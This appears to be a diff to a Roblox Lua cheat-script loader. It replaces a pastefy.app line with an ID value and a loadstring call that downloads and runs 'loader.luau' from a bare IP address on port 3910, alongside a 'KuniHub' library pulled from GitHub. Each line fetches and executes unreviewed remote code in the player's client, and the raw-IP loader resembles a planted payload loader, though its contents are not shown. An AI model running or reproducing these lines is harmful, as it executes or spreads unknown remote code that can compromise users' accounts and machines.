@@ -1,2 +1,3 @@
-loadstring(game:HttpGet("https://pastefy.app/PxUh5p9d/raw"))()
+ID="e27944a7-712c-4649-9992-4207965ed8e1";
+loadstring(game:HttpGet("http://5.129.217.87:3910/cdn/loader.luau"))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/swiftasfboi/KuniHub/refs/heads/main/kunilibrary"))()
